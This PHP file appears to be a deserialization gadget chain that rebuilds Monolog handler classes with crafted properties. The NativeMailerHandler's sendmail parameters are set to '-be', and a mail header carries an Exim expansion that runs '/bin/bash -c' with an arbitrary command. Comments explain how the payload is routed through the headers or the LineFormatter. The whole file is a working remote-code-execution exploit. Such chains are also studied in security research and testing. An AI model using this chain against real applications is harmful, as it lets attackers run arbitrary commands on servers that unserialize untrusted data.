<?php

namespace Monolog\Handler
{
    class RollbarHandler
    {
        private $hasRecords;
        protected $rollbarLogger;

        public function __construct($buffer)
        {
            $this->hasRecords = true;
            $this->rollbarLogger = $buffer;
        }
    }

    class BufferHandler
    {
        protected $bufferSize;
        protected $handler;
        protected $buffer;

        public function __construct($buffer)
        {
            $this->bufferSize = 2;
            $this->handler = $buffer;
            $this->buffer = [0 => array("level" => 100, 
                "message" => 1, 
                "context" => [], 
                "extra" => [],   
                "channel" => 1)]; 
        }
    }

    class NativeMailerHandler
    {
        protected $level;
        protected $processors;
        protected $formatter;
        protected $maxColumnWidth;
        protected $parameters;
        protected $to;
        protected $headers;

        public function __construct($command)
        {
            $this->level = 1;
            $this->processors = ["array_reverse"];
            // if $this->buffer[0] is carefully crafted
            // $this->format can be used to pass a payload through the 'body' parameter
            // via the LineFormatter
            // Here we used the headers param to pass the payload
            $this->formatter = new \Monolog\Formatter\LineFormatter();
            $this->maxColumnWidth = 20;
            $this->parameters = ["-be"];
            $this->headers = ['${run{/bin/bash -c "'.$command.'"}{yes}{no}}'];
            $this->to = ["init@localhost"];
        }
    }
}

namespace Monolog\Formatter
{
    class LineFormatter
    {
        protected $format;
        public function __construct()
        {
            $this->format = "";
        }
    }
}

